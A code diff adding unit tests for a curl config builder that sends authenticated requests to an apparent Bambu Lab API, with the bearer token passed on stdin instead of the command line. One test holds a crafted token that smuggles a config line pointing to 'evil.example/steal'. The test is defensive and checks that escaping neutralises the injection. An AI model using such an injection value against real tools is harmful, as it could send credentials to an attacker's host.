@@ -585,6 +585,72 @@ test("splitHttp separates body and status", () => {
   assert.deepEqual(M.splitHttp("no marker"), { body: "no marker", status: 0 });
 });
 
+// ---- authenticated curl transport (config-on-stdin, never argv) -----
+
+test("curlEscape strips CR/LF and escapes backslash + quote", () => {
+  assert.equal(M.curlEscape('say "hi"'), 'say \\"hi\\"');
+  assert.equal(M.curlEscape("back\\slash"), "back\\\\slash");
+  assert.equal(M.curlEscape("line1\r\nline2"), "line1line2");
+  assert.equal(M.curlEscape(undefined), "");
+  assert.equal(M.curlEscape(null), "");
+});
+
+test("curlConfigText builds a GET config with the bearer header", () => {
+  const cfg = M.curlConfigText({ token: "AQBsecret", url: "https://api.bambulab.com/x", maxFilesizeBytes: 8000000 });
+  assert.match(cfg, /^silent$/m);
+  assert.match(cfg, /^show-error$/m);
+  assert.match(cfg, /^max-time = 20$/m);
+  assert.match(cfg, /^max-filesize = 8000000$/m);
+  assert.match(cfg, /^max-redirs = 0$/m);
+  assert.match(cfg, /^header = "Authorization: Bearer AQBsecret"$/m);
+  assert.match(cfg, /^header = "User-Agent: bambu_network_agent/m);
+  assert.match(cfg, /^header = "Accept: application\/json"$/m);
+  assert.match(cfg, /^write-out = "\\n__HTTP__%\{http_code\}"$/m);
+  assert.match(cfg, /^url = "https:\/\/api\.bambulab\.com\/x"$/m);
+  assert.ok(!/request =/.test(cfg), "no method line for a plain GET");
+});
+
+test("curlConfigText adds method/data/extraHeaders and skips the auth header with no token", () => {
+  const cfg = M.curlConfigText({
+    url: "https://api.bambulab.com/y", method: "POST", data: "{}",
+    extraHeaders: ["Content-Type: application/json"],
+  });
+  assert.match(cfg, /^request = "POST"$/m);
+  assert.match(cfg, /^data = "\{\}"$/m);
+  assert.match(cfg, /^header = "Content-Type: application\/json"$/m);
+  assert.ok(!/Authorization/.test(cfg), "no token given -> no Authorization header");
+});
+
+test("curlConfigText escapes a hostile token so it cannot inject a config line", () => {
+  const hostile = 'x"\nurl = "https://evil.example/steal';
+  const cfg = M.curlConfigText({ token: hostile, url: "https://api.bambulab.com/z" });
+  // Exactly one url= line, and it's the real one: stripping the embedded
+  // newline and escaping the quotes folds the whole injection attempt into
+  // inert text inside the Authorization header's value, on one line, rather
+  // than letting it start a second directive.
+  const lines = cfg.split("\n");
+  const urlLines = lines.filter((l) => l.startsWith("url ="));
+  assert.equal(urlLines.length, 1);
+  assert.equal(urlLines[0], 'url = "https://api.bambulab.com/z"');
+  assert.ok(!lines.some((l) => l.startsWith("url =") && l.includes("evil.example")),
+    "the attacker's url= never becomes its own directive");
+  assert.match(cfg, /^header = "Authorization: Bearer x\\"url = \\"https:\/\/evil\.example\/steal"$/m);
+});
+
+test("curlPipeCommand is a constant argv with only a non-secret byte cap interpolated", () => {
+  const cmd = M.curlPipeCommand(8000000);
+  assert.deepEqual(cmd, ["bash", "-c", "set -o pipefail; curl -K - | head -c 8000001"]);
+  assert.deepEqual(M.curlPipeCommand(), ["bash", "-c", "set -o pipefail; curl -K - | head -c 8000001"]);
+});
+
+test("a bearer token never appears in the curl argv, only in stdin config text", () => {
+  const token = "AQB-CANARY-TOKEN-abc123";
+  const cmd = M.curlPipeCommand(1000);
+  const cfg = M.curlConfigText({ token, url: "https://api.bambulab.com/w" });
+  assert.ok(!cmd.some((a) => a.includes(token)), "argv must not contain the token");
+  assert.ok(cfg.includes(token), "the token does travel, but only as stdin data");
+});
+
 test("relTime", () => {
   const now = 10_000_000_000;
   assert.equal(M.relTime(now - 5000, now), "5s ago");
